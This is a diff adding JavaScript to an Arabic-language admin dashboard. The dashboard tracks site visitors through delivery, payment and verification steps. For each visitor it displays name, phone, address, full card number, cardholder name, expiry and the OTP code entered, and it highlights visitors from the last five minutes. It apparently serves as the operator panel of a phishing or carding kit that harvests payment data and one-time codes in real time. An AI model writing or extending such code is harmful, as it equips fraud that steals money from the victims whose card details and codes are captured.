@@ -3183,3 +3183,318 @@ window.restoreVisitor = restoreVisitor;
 window.permanentDeleteVisitor = permanentDeleteVisitor;
 window.emptyTrash = emptyTrash;
 window.toggleVisitorSelection = toggleVisitorSelection;
+
+// ==========================================
+// PROFESSIONAL COMPACT CARD SYSTEM
+// ==========================================
+
+// Filter state
+let currentFilter = 'all';
+
+// Sort visitors by recency
+function sortVisitorsByRecency() {
+  allAdminVisitors.sort((a, b) => {
+    const aTime = new Date(a.last_activity || a.created_at || 0);
+    const bTime = new Date(b.last_activity || b.created_at || 0);
+    return bTime - aTime;
+  });
+}
+
+// Apply filter and render
+function applyFilterAndRender() {
+  sortVisitorsByRecency();
+  
+  let filteredVisitors = [...allAdminVisitors];
+  
+  if (currentFilter === 'new') {
+    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
+    filteredVisitors = filteredVisitors.filter(v => {
+      const createdAt = new Date(v.created_at || v.timestamp || 0);
+      return (v.isNew || createdAt > fiveMinutesAgo) && !v.verification_submitted;
+    });
+  } else if (currentFilter === 'pending') {
+    filteredVisitors = filteredVisitors.filter(v => {
+      return (v.form_submitted && !v.payment_submitted) || 
+             (v.payment_submitted && !v.verification_submitted);
+    });
+  } else if (currentFilter === 'completed') {
+    filteredVisitors = filteredVisitors.filter(v => {
+      return v.verification_submitted === true;
+    });
+  }
+  
+  renderFilteredVisitors(filteredVisitors);
+  updateFilterCounts();
+}
+
+// Update filter counts
+function updateFilterCounts() {
+  const counts = {
+    all: allAdminVisitors.length,
+    new: 0,
+    pending: 0,
+    completed: 0
+  };
+  
+  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
+  
+  allAdminVisitors.forEach(v => {
+    const createdAt = new Date(v.created_at || v.timestamp || 0);
+    if ((v.isNew || createdAt > fiveMinutesAgo) && !v.verification_submitted) counts.new++;
+    if ((v.form_submitted && !v.payment_submitted) || (v.payment_submitted && !v.verification_submitted)) counts.pending++;
+    if (v.verification_submitted) counts.completed++;
+  });
+  
+  document.querySelectorAll('.filter-btn').forEach(btn => {
+    const filter = btn.dataset.filter;
+    if (filter && counts[filter] !== undefined) {
+      const countSpan = btn.querySelector('.count');
+      if (countSpan) countSpan.textContent = counts[filter];
+    }
+  });
+}
+
+// Render filtered visitors
+function renderFilteredVisitors(visitors) {
+  const grid = document.getElementById('visitorsGrid');
+  if (!grid) return;
+  
+  grid.innerHTML = '';
+  
+  if (visitors.length === 0) {
+    const filterNames = {
+      'all': 'لا يوجد زوار',
+      'new': 'لا توجد طلبات جديدة',
+      'pending': 'لا توجد طلبات عالقة',
+      'completed': 'لا توجد طلبات مكتملة'
+    };
+    grid.innerHTML = `<div class="empty-state"><span>📭</span><h3>${filterNames[currentFilter]}</h3><p>جرب فلتراً آخر</p></div>`;
+    return;
+  }
+  
+  const fragment = document.createDocumentFragment();
+  visitors.forEach((visitor, index) => {
+    const cardHTML = createCompactCard(visitor);
+    const tempDiv = document.createElement('div');
+    tempDiv.innerHTML = cardHTML;
+    const card = tempDiv.firstElementChild;
+    card.style.animationDelay = `${index * 30}ms`;
+    fragment.appendChild(card);
+  });
+  
+  grid.appendChild(fragment);
+}
+
+// Set active filter
+function setActiveFilter(filter) {
+  currentFilter = filter;
+  document.querySelectorAll('.filter-btn').forEach(btn => {
+    btn.classList.toggle('active', btn.dataset.filter === filter);
+  });
+  applyFilterAndRender();
+}
+
+// Create compact card
+function createCompactCard(visitor) {
+  const delivery = visitor.delivery_data || {};
+  const payment = visitor.payment_data || {};
+  const verification = visitor.verification_data || {};
+  const page = visitor.current_page || 'home';
+  const isOnline = visitor.is_online === true;
+  const sessionId = visitor.session_id || 'unknown';
+  const countryCode = visitor.country_code || '';
+  const displayName = delivery.fullName || payment.cardHolder || 'زائر ' + sessionId.substring(0, 6);
+  
+  const deliveryDone = visitor.form_submitted === true;
+  const paymentDone = visitor.payment_submitted === true;
+  const verificationDone = visitor.verification_submitted === true;
+  
+  // Status border color
+  let statusColor = 'var(--warning)';
+  if (verificationDone) statusColor = 'var(--success)';
+  else if (deliveryDone && paymentDone) statusColor = 'var(--primary)';
+  else if (deliveryDone) statusColor = '#3b82f6';
+  
+  const createdAt = visitor.created_at || visitor.timestamp || new Date().toISOString();
+  const lastActivity = visitor.last_activity || createdAt;
+  const isNew = visitor.isNew || (new Date() - new Date(createdAt) < 5 * 60 * 1000);
+  
+  const otpValue = verification.otp || '';
+  
+  let currentStep = 'الرئيسية';
+  if (page === 'delivery') currentStep = 'التوصيل';
+  else if (page === 'payment') currentStep = 'الدفع';
+  else if (page === 'verification') currentStep = 'التحقق';
+  
+  const flag = getCountryFlag(countryCode);
+  
+  return `
+    <div class="compact-card ${isNew ? 'is-new' : ''}" 
+         data-session="${sessionId}" 
+         data-online="${isOnline}"
+         data-status="${verificationDone ? 'completed' : (deliveryDone ? 'in-progress' : 'pending')}"
+         onclick="expandCard(this, '${sessionId}')">
+      
+      <div class="status-border" style="background: ${statusColor}"></div>
+      
+      <div class="compact-header">
+        <div class="compact-left">
+          <span class="compact-flag">${flag}</span>
+          <span class="compact-name">${escapeHtml(displayName)}</span>
+          ${isNew ? '<span class="compact-new-badge">جديد</span>' : ''}
+        </div>
+        <div class="compact-right">
+          <span class="compact-status">${currentStep}</span>
+          <span class="compact-time relative-time" data-timestamp="${lastActivity}">${getRelativeTime(lastActivity)}</span>
+        </div>
+      </div>
+      
+      <div class="compact-stats">
+        <div class="stat-item ${deliveryDone ? 'done' : ''}">
+          <span class="stat-icon">📦</span>
+          <span class="stat-label">توصيل</span>
+        </div>
+        <div class="stat-item ${paymentDone ? 'done' : ''}">
+          <span class="stat-icon">💳</span>
+          <span class="stat-label">دفع</span>
+        </div>
+        <div class="stat-item ${verificationDone ? 'done' : ''}">
+          <span class="stat-icon">🔐</span>
+          <span class="stat-label">تحقق</span>
+        </div>
+      </div>
+      
+      <div class="card-expanded" id="expanded_${sessionId}">
+        <div class="exp-tabs">
+          <button class="exp-tab active" onclick="event.stopPropagation(); switchExpTab(this, '${sessionId}', 'delivery')">
+            <span>📦</span> التوصيل
+          </button>
+          <button class="exp-tab" onclick="event.stopPropagation(); switchExpTab(this, '${sessionId}', 'payment')">
+            <span>💳</span> الدفع
+          </button>
+          <button class="exp-tab" onclick="event.stopPropagation(); switchExpTab(this, '${sessionId}', 'verification')">
+            <span>🔐</span> التحقق
+          </button>
+        </div>
+        
+        <div class="exp-content">
+          <div class="exp-panel active" data-panel="delivery">
+            ${buildCompactDeliverySummary(delivery)}
+            <button class="exp-action-btn" onclick="event.stopPropagation(); openHistoryModal('${sessionId}', 'delivery', this)">
+              📋 سجل التوصيل
+            </button>
+          </div>
+          <div class="exp-panel" data-panel="payment">
+            ${buildCompactPaymentSummary(payment)}
+            <button class="exp-action-btn" onclick="event.stopPropagation(); openHistoryModal('${sessionId}', 'payment', this)">
+              📋 سجل الدفع
+            </button>
+          </div>
+          <div class="exp-panel" data-panel="verification">
+            ${otpValue ? `
+              <div class="otp-showcase">
+                <div class="otp-label">رمز التحقق:</div>
+                <div class="otp-digits-show">
+                  ${otpValue.split('').map(d => `<span class="otp-d">${d}</span>`).join('')}
+                </div>
+              </div>
+            ` : '<div class="no-data">لا يوجد رمز</div>'}
+            <button class="exp-action-btn" onclick="event.stopPropagation(); openHistoryModal('${sessionId}', 'verification', this)">
+              📋 سجل التحقق
+            </button>
+          </div>
+        </div>
+        
+        <div class="exp-actions">
+          <button class="exp-action delete" onclick="event.stopPropagation(); softDeleteVisitor('${sessionId}')">
+            🗑️ حذف
+          </button>
+          <button class="exp-action ban" onclick="event.stopPropagation(); banVisitor('${sessionId}', '${escapeHtml(visitor.ip_address || '')}')">
+            🚫 حظر
+          </button>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+// Expand/Collapse card
+function expandCard(cardElement, sessionId) {
+  document.querySelectorAll('.compact-card.expanded').forEach(card => {
+    if (card !== cardElement) {
+      card.classList.remove('expanded');
+    }
+  });
+  cardElement.classList.toggle('expanded');
+}
+
+// Switch expanded tab
+function switchExpTab(button, sessionId, panelName) {
+  const card = button.closest('.compact-card');
+  if (!card) return;
+  
+  card.querySelectorAll('.exp-tab').forEach(t => t.classList.remove('active'));
+  button.classList.add('active');
+  
+  card.querySelectorAll('.exp-panel').forEach(p => {
+    p.classList.toggle('active', p.dataset.panel === panelName);
+  });
+}
+
+// Build compact delivery summary
+function buildCompactDeliverySummary(delivery) {
+  if (!delivery || Object.keys(delivery).length === 0) {
+    return '<div class="no-data">لا توجد بيانات</div>';
+  }
+  
+  let html = '<div class="detail-grid">';
+  if (delivery.fullName) html += `<div class="detail-item"><span class="label">الاسم:</span><span class="value">${escapeHtml(delivery.fullName)}</span></div>`;
+  if (delivery.phone) html += `<div class="detail-item"><span class="label">الهاتف:</span><span class="value">${escapeHtml(delivery.phone)}</span></div>`;
+  if (delivery.address) html += `<div class="detail-item full"><span class="label">العنوان:</span><span class="value">${escapeHtml(delivery.address)}</span></div>`;
+  if (delivery.city) html += `<div class="detail-item"><span class="label">المدينة:</span><span class="value">${escapeHtml(delivery.city)}</span></div>`;
+  html += '</div>';
+  return html;
+}
+
+// Build compact payment summary
+function buildCompactPaymentSummary(payment) {
+  if (!payment || Object.keys(payment).length === 0) {
+    return '<div class="no-data">لا توجد بيانات</div>';
+  }
+  
+  let html = '<div class="detail-grid">';
+  const cardNum = payment.cardNumber || payment.card_number || '';
+  if (cardNum) html += `<div class="detail-item"><span class="label">البطاقة:</span><span class="value">${escapeHtml(cardNum)}</span></div>`;
+  if (payment.cardHolder) html += `<div class="detail-item"><span class="label">الحامل:</span><span class="value">${escapeHtml(payment.cardHolder)}</span></div>`;
+  if (payment.expiry) html += `<div class="detail-item"><span class="label">الانتهاء:</span><span class="value">${escapeHtml(payment.expiry)}</span></div>`;
+  if (payment.paymentMethod) {
+    const methodText = payment.paymentMethod === 'cash' ? 'نقداً' : payment.paymentMethod;
+    html += `<div class="detail-item"><span class="label">الطريقة:</span><span class="value">${escapeHtml(methodText)}</span></div>`;
+  }
+  html += '</div>';
+  return html;
+}
+
+// Escape HTML helper
+function escapeHtml(text) {
+  if (!text) return '';
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+// Get country flag
+function getCountryFlag(countryCode) {
+  if (!countryCode || countryCode === 'XX') return '🌍';
+  try {
+    return countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
+  } catch { return '🌍'; }
+}
+
+// Export functions to window
+window.createCompactCard = createCompactCard;
+window.expandCard = expandCard;
+window.switchExpTab = switchExpTab;
+window.setActiveFilter = setActiveFilter;
+window.applyFilterAndRender = applyFilterAndRender;
+window.updateFilterCounts = updateFilterCounts;
